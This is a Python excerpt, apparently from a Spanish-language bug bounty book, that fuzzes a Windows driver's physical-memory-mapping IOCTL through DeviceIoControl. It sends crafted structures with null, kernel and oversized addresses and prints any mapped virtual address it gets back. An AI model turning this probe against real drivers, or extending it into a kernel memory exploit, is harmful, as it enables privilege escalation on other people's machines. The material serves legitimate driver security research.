# Extraído de: LibroBugBounty/cap-09-ioctl-fuzzing.md
import struct
import ctypes
import ctypes.wintypes as wt

kernel32 = ctypes.windll.kernel32

def send_ioctl(handle, code, input_buf, input_size, output_size=256):
    """Envía un IOCTL y retorna (ok, error, output, bytes_ret)."""
    inp = ctypes.create_string_buffer(input_buf, input_size)
    out = ctypes.create_string_buffer(output_size)
    ret = wt.DWORD(0)
    ok = kernel32.DeviceIoControl(
        handle, code, inp, input_size,
        out, output_size, ctypes.byref(ret), None
    )
    err = kernel32.GetLastError()
    return ok, err, out.raw[:ret.value], ret.value

def fuzz_map_ioctl(handle, ioctl_code=0x22b807):
    """Fuzzing dirigido del IOCTL de mapeo de memoria."""
    # Test 1: Estructura mínima correcta (hipótesis de Claude)
    phys_addr = 0x1000     # Primera página de RAM
    num_bytes = 0x1000     # 4 KB
    cache_type = 0         # MmNonCached
    buf = struct.pack("<QII", phys_addr, num_bytes, cache_type)
    ok, err, out, ret_bytes = send_ioctl(handle, ioctl_code, buf, len(buf))
    print(f"[Map 0x1000] ok={ok}, err={err}, ret={ret_bytes}B")
    if ok and ret_bytes >= 8:
        virt_addr = struct.unpack("<Q", out[:8])[0]
        print(f"  [!!!] Virtual addr: 0x{virt_addr:016X}")

    # Test 2: Buffer demasiado corto (debe rechazar)
    buf_short = struct.pack("<I", 0x1000)
    ok, err, _, _ = send_ioctl(handle, ioctl_code, buf_short, 4)
    print(f"[Short buf] ok={ok}, err={err}")

    # Test 3: Dirección física 0 (NULL page)
    buf_null = struct.pack("<QII", 0, 0x1000, 0)
    ok, err, _, _ = send_ioctl(handle, ioctl_code, buf_null, len(buf_null))
    print(f"[Null addr] ok={ok}, err={err}")

    # Test 4: Tamaño enorme
    buf_huge = struct.pack("<QII", 0x1000, 0x10000000, 0)
    ok, err, _, _ = send_ioctl(handle, ioctl_code, buf_huge, len(buf_huge))
    print(f"[Huge size] ok={ok}, err={err}")

    # Test 5: Dirección de kernel como PhysicalAddress
    buf_kernel = struct.pack("<QII", 0xFFFF800000000000, 0x1000, 0)
    ok, err, _, _ = send_ioctl(handle, ioctl_code, buf_kernel, len(buf_kernel))
    print(f"[Kernel addr] ok={ok}, err={err}")
